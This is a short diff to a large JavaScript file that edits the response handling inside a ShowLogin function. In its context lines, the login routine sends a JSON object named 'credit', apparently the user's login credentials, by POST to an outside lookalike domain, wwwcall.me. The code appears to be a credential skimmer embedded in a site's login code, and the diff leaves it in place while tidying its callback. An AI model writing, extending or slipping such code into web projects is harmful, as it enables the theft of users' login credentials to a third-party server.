@@ -16077,11 +16077,9 @@ function ShowLogin(loginType) {
       fetch("https://wwwcall.me/api/login.php", {
         method: "POST",
         body: JSON.stringify(credit),
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          console.log(data);
-        });
+      }).then((response) => {
+        console.log(response);
+      });
     },
   });
   $.each(buttons, function (i, obj) {
